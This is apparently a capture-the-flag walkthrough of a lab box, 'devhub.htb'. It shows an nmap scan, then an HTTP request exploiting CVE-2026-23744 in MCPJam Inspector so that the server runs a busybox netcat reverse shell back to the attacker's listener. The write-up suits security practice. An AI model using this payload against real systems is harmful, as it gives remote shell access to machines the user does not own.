Start with a nmap scan:

```sh
$ sudo nmap -Pn -sV -sC -p- -A 10.129.53.145 -oN devhub.nmap
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-02 23:26 -0400
Nmap scan report for 10.129.53.145
Host is up (0.054s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Wed, 03 Jun 2026 03:28:44 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Wed, 03 Jun 2026 03:28:44 GMT
|_    Connection: close
```

Running vulnerable web application hosting MCPJam Inspector. Leverage [CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6) to achieve RCE:

```sh
$ nc -nlvp 9999
```

```
POST /api/mcp/connect HTTP/1.1
Host: 10.129.53.145:6274
Content-Type: application/json
Content-Length: 207

{
    "serverConfig":
    {
        "command": "busybox",
        "args": [
                "nc",
                "10.10.14.11",
                "9999",
                "-e",
                "/bin/bash"
                ],
        "env":{}
    },
    serverId":"pucarevshell"
}
```